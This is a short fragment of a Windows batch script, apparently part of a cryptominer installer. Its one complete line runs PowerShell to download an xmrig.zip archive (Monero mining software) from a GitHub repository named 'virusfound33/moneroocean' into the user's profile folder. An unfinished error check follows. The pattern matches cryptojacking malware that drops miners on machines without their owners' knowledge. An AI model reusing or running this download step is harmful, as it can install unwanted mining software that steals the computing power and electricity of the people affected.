...
powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/virusfound33/moneroocean/master/xmrig.zip', '%USERPROFILE%\xmrig.zip')"
if errorlevel 1 (
